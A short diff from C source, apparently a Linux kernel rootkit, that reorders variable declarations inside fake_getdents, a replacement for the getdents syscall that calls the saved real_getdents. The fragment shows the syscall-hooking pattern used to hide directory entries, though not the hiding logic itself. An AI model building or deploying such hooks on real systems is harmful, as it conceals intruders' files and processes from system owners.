@@ -29,17 +29,17 @@ asmlinkage long (*real_getdents)(struct pt_regs *);
 
 asmlinkage long fake_getdents(struct pt_regs *regs) {
   int i, j;
+  long bytes_read;
   unsigned char *buffer;
   unsigned char *buffer_dirent;
   unsigned char *buffer_next_dirent;
   unsigned short d_reclen;
   unsigned short last_d_reclen;
   unsigned short next_d_reclen;
-  long bytes_read;
-  struct linux_dirent __user *dirent_user;
   struct linux_dirent *dirent;
   struct linux_dirent *last_dirent;
   struct linux_dirent *next_dirent;
+  struct linux_dirent __user *dirent_user;
 
   bytes_read = (*real_getdents)(regs);
   dirent_user = (struct linux_dirent __user *)regs->si;
